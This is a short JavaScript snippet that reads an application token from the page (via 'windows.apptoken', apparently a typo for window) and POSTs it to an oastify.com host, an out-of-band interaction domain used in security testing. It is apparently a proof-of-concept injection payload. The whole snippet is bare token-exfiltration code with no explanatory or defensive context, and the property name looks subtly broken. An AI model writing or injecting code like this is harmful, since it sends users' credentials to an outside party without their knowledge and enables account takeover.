var apptoken = windows.apptoken;

const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: apptoken })
};
fetch('https://q3uz5uffubu7mt9ntzz67yeaf1ls9pxe.oastify.com/test2', requestOptions)
    .then(response => response.json())
